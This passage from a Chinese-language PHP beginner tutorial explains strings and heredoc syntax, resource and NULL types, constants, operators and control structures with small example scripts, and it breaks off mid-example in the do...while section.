title="标量类型—字符串"></a>标量类型—字符串</h5><p>字符串型可以用三种方法定义：<strong>单引号形式</strong>、<strong>双引号形式</strong>和<strong>Heredoc结构形式</strong>。</p><p>前两种形式大家都好理解，但是第三种（为了解决字符串太长产生的办法）是什么呢？</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">COD</span>Example of stringspanning multiple linesusing heredoc syntax<span class="token punctuation">.</span><span class="token constant">COD</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token delimiter">?></span> </code></pre><blockquote><p>语法：<code>&lt;&lt;&lt;</code>在该提示符后面，要定义个标识符，然后是一个新行。接下来是字符串，最后要用前面定义的标识符作为结束标志。</p><p>变量替换在PHP中使用，这意味着您需要转义$,如果不这样做，PHP将尝试变量替换</p></blockquote><p>imooc上讲解：</p><blockquote><p>在赋值符号后，输入定界符“&lt;&lt;&lt;”,接着是标识符，你可以用你的女神作为标识符“GOD”，如第2行，也可以使用你喜欢的狗狗，“DOG”作为标识符，但是，结尾处的标识符也必须是一样的。此外，在结尾的一行，如第7行，一定要另起一行，并且此行除了“GOD”，并以“；”号结束之外，不能有任何其他字符，前后都不能有，包括空格，否则会出现错误的哦。切记切记哦。</p></blockquote><p>在字符串中含有引号有以下三种方法进行解决</p><p>第一种方案：在单引号中嵌入双引号</p><p>第二种方案：在双引号中嵌入单引号</p><p>第三种方案：使用转义符“\”</p><p>当双引号中包含变量时，变量会与双引号中的<strong>内容</strong>连接在一起；</p><p>当单引号中包含变量时，变量会被当做<strong>字符串</strong>输出；</p><p>做个实验看看吧：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token variable">$love</span> <span class="token operator">=</span> <span class="token string">"I love you!"</span><span class="token punctuation">;</span> <span class="token variable">$string1</span> <span class="token operator">=</span> <span class="token string">"Jeff,$love"</span><span class="token punctuation">;</span><span class="token variable">$string2</span> <span class="token operator">=</span> <span class="token string">'Jeff,$love'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$string1</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$string2</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h4 id="PHP是第一种特殊类型–资源"><a href="#PHP是第一种特殊类型–资源" class="headerlink" title="PHP是第一种特殊类型–资源"></a>PHP是第一种特殊类型–资源</h4><p>资源（resource）：资源是由专门的函数来建立和使用的，例如打开文件、数据连接、图形画布。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"f.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//打开文件</span><span class="token variable">$con</span><span class="token operator">=</span><span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//连接数据库</span><span class="token variable">$img</span><span class="token operator">=</span><span class="token function">imagecreate</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//图形画布</span><span class="token delimiter">?></span></code></pre><p>当你夺取了服务器权限，想查看服务器上的文件，PHP是可以做到的</p><pre class=" language-php"><code class="language-php"><span class="token variable">$file_handle</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/data/webroot/resource/php/f.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>“/data/webroot/resource/php/f.txt”—-&gt;文件路径</p><p>“r”表示是“read”</p><blockquote><p>文本文件保存时一定要设置为UTF-8格式，避免出现乱码。</p></blockquote><h4 id="PHP第二种特殊类型—空类型"><a href="#PHP第二种特殊类型—空类型" class="headerlink" title="PHP第二种特殊类型—空类型"></a>PHP第二种特殊类型—空类型</h4><p>NULL是空类型，对大小写不敏感，一般只有三种情况变量表示是空：</p><p>1、未赋值</p><p>2、赋值为NULL</p><p>3、被unset</p><h2 id="0X03–常量"><a href="#0X03–常量" class="headerlink" title="0X03–常量"></a>0X03–常量</h2><p>常量可以理解为值不变的量，在其被定义之后，在脚本的其他地方都不会被改变。</p><p>define（）函数的语法格式为：</p><pre class=" language-php"><code class="language-php">bool <span class="token function">define</span><span class="token punctuation">(</span>string <span class="token variable">$constant_name</span><span class="token punctuation">,</span> mixed <span class="token variable">$value</span><span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token variable">$case_sensitive</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><blockquote><p>第一个参数“constant_name”为必选参数，常量名称,即标志符，常量的命名规则与变量的一致，但是要注意哦，它可不带美元符号哦。第二个参数“value”为必选参数，它是常量的值。第三个参数“case_sensitive”为可选参数，指定是否大小写敏感，设定为true表示不敏感，一般不指定第三个参数的情况下，默认第三个参数的值为false。</p><p>（注： string表示参数类型为字符串类型，mixed表示参数类型可以接受为多种不同的类型，case_sensitive = true表示默认为布尔类型TRUE）</p></blockquote><p>试着做一个小实验吧：</p><p>定义一个π~</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string">"PII"</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"PI"</span><span class="token punctuation">,</span><span class="token number">3.14</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">,</span><span class="token number">3.14</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PI</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PII</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>常量的作用是不用重复定义，篡改变量值，同时可以提高代码的可维护性</p><h4 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h4><p>常见的系统常量是：</p><p>（1）FILE :php程序文件名。它可以帮助我们获取当前文件在服务器的物理位置。</p><p>（2）LINE :PHP程序文件行数。它可以告诉我们，当前代码在第几行。</p><p>（3）PHP_VERSION:当前解析器的版本号。它可以告诉我们当前PHP解析器的版本号，我们可以提前知道我们的PHP代码是否可被该PHP解析器解析。</p><p>（4）PHP_OS：执行当前PHP版本的操作系统名称。它可以告诉我们服务器所用的操作系统名称，我们可以根据该操作系统优化我们的代码。</p><p>做个实验试一下吧：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token constant">__FILE__</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">__LINE__</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_VERSION</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_OS</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h4 id="常量如何取值"><a href="#常量如何取值" class="headerlink" title="常量如何取值"></a>常量如何取值</h4><p>第一种是使用常量名直接获取值。</p><p>第二种是使用constant()函数。它和直接使用常量名输出的效果是一样的，但函数可以动态的输出不同的常量，在使用上要灵活、方便，其语法格式如下：</p><pre class=" language-php"><code class="language-php">mixed <span class="token function">constant</span><span class="token punctuation">(</span>string constant_name<span class="token punctuation">)</span></code></pre><p>第一个参数constant_name为要获取常量的名称，也可为存储常量名的变量。如果成功则返回常量的值，失败则提示错误信息常量没有被定义。（注：mixed表示函数返回值类型为多种不同的类型，string表示参数类型为字符串类型）</p><h4 id="如何判定常量是否被定义"><a href="#如何判定常量是否被定义" class="headerlink" title="如何判定常量是否被定义"></a>如何判定常量是否被定义</h4><p>defined()函数可以帮助我们判断一个常量是否已经定义，其语法格式为：</p><pre class=" language-php"><code class="language-php">bool <span class="token function">defined</span><span class="token punctuation">(</span>string constants_name<span class="token punctuation">)</span></code></pre><p>它只有参数constant_name，指的是要获取常量的名称，若存在则返回布尔类型true，否则返回布尔类型false; （注：bool表示函数返回值类型为布尔类型）</p><p>尝试一下吧：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"PI1"</span><span class="token punctuation">,</span><span class="token number">3.14</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string">"PI1"</span><span class="token punctuation">;</span><span class="token variable">$is1</span> <span class="token operator">=</span> <span class="token function">defined</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$is2</span> <span class="token operator">=</span> <span class="token function">defined</span><span class="token punctuation">(</span><span class="token string">"PI2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$is1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$is2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h2 id="0X04–运算符"><a href="#0X04–运算符" class="headerlink" title="0X04–运算符"></a>0X04–运算符</h2><p>运算符是告诉PHP做相关运算的标识符号。</p><h4 id="基本运算符"><a href="#基本运算符" class="headerlink" title="基本运算符"></a>基本运算符</h4><p>“+”、“-”、“*”、“/”、“%”</p><p>（特意说一下：“%”是取模，即余数）</p><h4 id="PHP中的赋值运算符"><a href="#PHP中的赋值运算符" class="headerlink" title="PHP中的赋值运算符"></a>PHP中的赋值运算符</h4><p>1）“=”：把右边表达式的值赋给左边的运算数。</p><p>2）“&amp;”：引用赋值，意味着两个变量都指向同一个数据。使两个变量共享一块内存，如果这个内存存储的数据变了，那么两个变量的值都会发生变化。</p><p>做个实验吧：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"Jeff真帅！"</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"Jeff真的帅！"</span><span class="token punctuation">;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">.</span><span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">.</span><span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h4 id="PHP中的比较运算符"><a href="#PHP中的比较运算符" class="headerlink" title="PHP中的比较运算符"></a>PHP中的比较运算符</h4><p>这个地方PHP有不同于别的语言的符号</p><p>“==” 等于</p><p>“===”全等</p><p>“!=”不等</p><p>“&lt;&gt;”不等</p><p>“!==”非全等</p><p>“&lt;”小于</p><p>“&gt;”大于</p><p>“&lt;=”小于等于</p><p>“&gt;=”大于等于</p><p>做个实验看看吧：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>      <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">===</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">&lt;</span><span class="token operator">></span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!==</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">&lt;</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">&lt;</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">></span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">&lt;=</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">>=</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">>=</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h4 id="PHP中的三元运算符"><a href="#PHP中的三元运算符" class="headerlink" title="PHP中的三元运算符"></a>PHP中的三元运算符</h4><blockquote><p>(“?:”)三元运算符也是一个比较运算符，对于表达式(expr1)?(expr2):(expr3)，如果expr1的值为true，则此表达式的值为expr2，否则为expr3。</p></blockquote><p>做个实验看看吧：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">78</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//成绩</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token operator">>=</span><span class="token number">60</span><span class="token operator">?</span><span class="token string">"及格"</span><span class="token punctuation">:</span><span class="token string">"不及格"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h4 id="PHP中的逻辑运算符"><a href="#PHP中的逻辑运算符" class="headerlink" title="PHP中的逻辑运算符"></a>PHP中的逻辑运算符</h4><blockquote><p>逻辑运算符主用是进行逻辑运算的，例如：逻辑与、逻辑或、逻辑异或、逻辑非等</p></blockquote><p>“and” 逻辑与 若$a与$b都为True，返回True</p><p>“or”  逻辑或  若$a与$b任一为True，返回True</p><p>“xor”  逻辑异或  若$a与$b有且仅有一个为True，返回True</p><p>“!”     逻辑非   若$a不为True，返回True</p><p>“&amp;&amp;”   逻辑与   若$a与$b都为True，返回True</p><p>“||”   逻辑或   若$a与$b任一为True，返回True</p><p>做个实验吧：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token constant">TRUE</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//A同意</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token constant">TRUE</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//B同意</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token constant">FALSE</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//C反对</span>    <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token constant">FALSE</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//D反对</span>    <span class="token comment" spellcheck="true">//咱顺便复习下三元运算符</span>    <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">and</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string">"通过"</span><span class="token punctuation">:</span><span class="token string">"不通过"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">or</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string">"通过"</span><span class="token punctuation">:</span><span class="token string">"不通过"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">xor</span> <span class="token variable">$c</span> <span class="token keyword">xor</span> <span class="token variable">$d</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string">"通过"</span><span class="token punctuation">:</span><span class="token string">"不通过"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token operator">!</span><span class="token variable">$c</span><span class="token operator">?</span><span class="token string">"通过"</span><span class="token punctuation">:</span><span class="token string">"不通过"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$d</span><span class="token operator">?</span><span class="token string">"通过"</span><span class="token punctuation">:</span><span class="token string">"不通过"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$b</span> <span class="token operator">||</span> <span class="token variable">$c</span>  <span class="token operator">||</span><span class="token variable">$d</span> <span class="token operator">?</span><span class="token string">"通过"</span><span class="token punctuation">:</span><span class="token string">"不通过"</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>注意看输出的参数即可</p><h4 id="PHP中的字符串连接运算符"><a href="#PHP中的字符串连接运算符" class="headerlink" title="PHP中的字符串连接运算符"></a>PHP中的字符串连接运算符</h4><p>感觉这个跟python中的“+”很像</p><p>1）连接运算符(“.”)：它返回将右参数附加到左参数后面所得的字符串</p><p>2）连接赋值运算符(“.=”)：它将右边参数附加到左边的参数后。</p><h4 id="PHP中的错误控制运算符"><a href="#PHP中的错误控制运算符" class="headerlink" title="PHP中的错误控制运算符"></a>PHP中的错误控制运算符</h4><p>可以先看一个栗子：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>   <span class="token variable">$conn</span> <span class="token operator">=</span> @<span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"username"</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string">"出错了，错误原因是："</span><span class="token punctuation">.</span><span class="token variable">$php_errormsg</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>可以发现：“@”是我们见到的新的一个符号</p><p>看看主要的说明</p><blockquote><p>PHP中提供了一个错误控制运算符“@”，对于一些可能会在运行过程中出错的表达式时，我们不希望出错的时候给客户显示错误信息，这样对用户不友好。于是，可以将@放置在一个PHP表达式之前，该表达式可能产生的任何错误信息都被忽略掉；</p><p>如果激活了track_error（这个玩意在php.ini中设置）特性，表达式所产生的任何错误信息都被存放在变量$php_errormsg中，此变量在每次出错时都会被覆盖，所以如果想用它的话必须尽早检查。</p><p>需要注意的是：错误控制前缀“@”不会屏蔽解析错误的信息，不能把它放在函数或类的定义之前，也不能用于条件结构例如if和foreach等。</p></blockquote><p>（ceil() 函数向上舍入为最接近的整数）</p><h2 id="0X05-PHP的结构"><a href="#0X05-PHP的结构" class="headerlink" title="0X05-PHP的结构"></a>0X05-PHP的结构</h2><h4 id="顺序结构"><a href="#顺序结构" class="headerlink" title="顺序结构"></a>顺序结构</h4><blockquote><p>顺序结构就像一条直线，按着顺序一直往下执行。我们编写的代码默认都是按照顺序结构执行的。</p></blockquote><h4 id="条件结构之（if…else…）"><a href="#条件结构之（if…else…）" class="headerlink" title="条件结构之（if…else…）"></a>条件结构之（if…else…）</h4><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span>条件<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre><blockquote><p>通过条件判断，若返回值为布尔值TRUE，则执行任务A，若返回值为FALSE，则执行任务B。</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span>条件一<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else if(条件二)&amp;#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token delimiter">?></span></code></pre><p>此处的是多重条件进行的一个运算</p><h4 id="条件结构之（switch…case…）"><a href="#条件结构之（switch…case…）" class="headerlink" title="条件结构之（switch…case…）"></a>条件结构之（switch…case…）</h4><p>与C++语句是一样的</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>条件<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span><span class="token keyword">case</span> 条件值一<span class="token punctuation">:</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> 条件值二<span class="token punctuation">:</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token punctuation">:</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token delimiter">?></span></code></pre><blockquote><p>首先判断条件，若条件的返回值为条件值一，则执行任务一，若条件返回的值为条件值二，则执行任务二，若条件的返回值既不是条件值一也不是条件值二，则执行默认任务。break的作用是结束switch（后面会有专门举例说明），使用 switch 语句可以避免冗长的 “if..else if..else”代码块。</p></blockquote><p>做个实验吧：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取1至50的随机数</span><span class="token variable">$info</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//提示信息</span><span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token string">"恭喜你！我是奆佬！"</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token string">"恭喜你！我是巨佬！"</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>     <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token string">"恭喜你！我是大佬！"</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">default</span> <span class="token punctuation">:</span>        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token string">"很遗憾！我是菜鸡！"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span> <span class="token keyword">echo</span> <span class="token variable">$info</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><p>同时注意：break语句是从该循环中跳出</p><h4 id="循环结构之（while）"><a href="#循环结构之（while）" class="headerlink" title="循环结构之（while）"></a>循环结构之（while）</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">while</span><span class="token punctuation">(</span>条件<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token delimiter">?></span></code></pre><blockquote><p>首先判断某个条件是否符合（条件返回值是否为TRUE），若符合则执行任务，执行完毕任务，再判断条件是否满足要求，符合则重复执行此任务，否则结束任务。</p></blockquote><p>一般是在不知道何时才能结束的循环的时候优先选择while循环</p><h4 id="循环结构之（do…while）"><a href="#循环结构之（do…while）" class="headerlink" title="循环结构之（do…while）"></a>循环结构之（do…while）</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">do</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;while(条件)</span><span class="token delimiter">?></span></code></pre><blockquote><p>首先执行任务（上一节的while语句是先判断条件是否成立，再执行任务），执行任务完毕，判断某个条件是否符合（条件返回值是否为TRUE），若符合则再次执行任务，执行完毕任务，继续判定条件。</p></blockquote><p>因此说明，碰到do…while循环，至少执行一次。</p><p>做个实验吧：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token comment" spellcheck="true">//A例子</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token variable">$sum</span>  <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>     <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token variable">$sum</span> <span class="token operator">=</span> <span class="token variable">$sum</span>  <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">echo</span> <span class="token string">"A例子的结果："</span><span class="token punctuation">.</span><span class="token variable">$sum</span><span class="token punctuation">.</span><span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//B例子</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token variable">$sum</span>  <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>                <span class="token keyword">do</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token variable">$sum</span> <span class="token operator">=</span> <span class="token variable">$sum</span>  <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token 